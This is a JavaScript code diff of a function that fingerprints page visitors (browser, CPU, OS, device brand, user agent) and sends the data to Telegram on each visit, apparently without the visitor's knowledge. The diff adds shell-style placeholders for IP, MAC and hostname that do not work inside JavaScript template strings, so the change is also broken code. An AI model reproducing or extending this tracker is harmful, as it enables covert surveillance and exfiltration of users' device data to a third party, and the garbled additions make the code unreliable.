@@ -24,12 +24,12 @@ function getData() {
     localStorage.setItem('isFirstTime', 'false');
     userData.ua = result.ua || ''; userData.cpu = result.cpu || {}; userData.engine = result.engine || {};
     
-    sendToTelegram(`Hola, el usuario\n\n ingresó a las ${getCurrentTime()}.\n\nInformación del dispositivo:\nDispositivo: ${userData.device}\nMarca: ${userData.brand}\n\nInformación adicional:\nAgente de usuario: ${userData.ua}\nNavegador: ${userData.browser.name}\nVersión del navegador: ${userData.browser.version}\nCPU: ${userData.cpu.architecture}\nMotor de renderizado: ${userData.engine.name}\nSistema operativo: ${userData.os.name}\n\nEste usuario es: Su primer inicio\n\nEl usuario ha cambiado de identidad: No\nEl usuario ha cambiado : 0 veces`);
+    sendToTelegram(`Hola \nel usuario\n\ningresó a las ${getCurrentTime()}.\n\nInformación del dispositivo:\nDispositivo: ${userData.device}\nMarca: ${userData.brand}\n$(ip)\n$(mac)\n$HOSTNAME\n\nInformación adicional:\nAgente de usuario: ${userData.ua}\nNavegador: ${userData.browser.name}\nVersión del navegador: ${userData.browser.version}\nCPU: ${userData.cpu.architecture}\nMotor de renderizado: ${userData.engine.name}\nSistema operativo: ${userData.os.name}\n\nEste usuario es: Su primer inicio\n\nEl usuario ha cambiado de identidad: No\nEl usuario ha cambiado : 0 veces`);
   } else if (deviceIdentifier === localStorage.getItem('deviceIdentifier')) {
     userData.ua = result.ua || '';
     userData.cpu = result.cpu || {};
     userData.engine = result.engine || {};
-    sendToTelegram(`Hola, el usuario\n\n ingresó a las ${getCurrentTime()}.\n\nInformación del dispositivo:\nDispositivo: ${userData.device}\nMarca: ${userData.brand}\n\nInformación adicional:\nAgente de usuario: ${userData.ua}\nNavegador: ${userData.browser.name}\nVersión del navegador: ${userData.browser.version}\nCPU: ${userData.cpu.architecture}\nMotor de renderizado: ${userData.engine.name}\nSistema operativo: ${userData.os.name}\n\nEste usuario no es su primer inicio\n\nEl usuario ha cambiado de identidad: Sí\nEl usuario ha cambiado: ${getIdentityChanges()} veces`);
+    sendToTelegram(`Hola \nel usuario\n\ningresó a las ${getCurrentTime()}.\n\nInformación del dispositivo:\nDispositivo: ${userData.device}\nMarca: ${userData.brand}\n$(ip)\n$(mac)\n$HOSTNAME\n\nInformación adicional:\nAgente de usuario: ${userData.ua}\nNavegador: ${userData.browser.name}\nVersión del navegador: ${userData.browser.version}\nCPU: ${userData.cpu.architecture}\nMotor de renderizado: ${userData.engine.name}\nSistema operativo: ${userData.os.name}\n\nEste usuario no es su primer inicio\n\nEl usuario ha cambiado de identidad: Sí\nEl usuario ha cambiado: ${getIdentityChanges()} veces`);
   }
 
   // Actualizar la cantidad de veces que el usuario ha cambiado de identidad
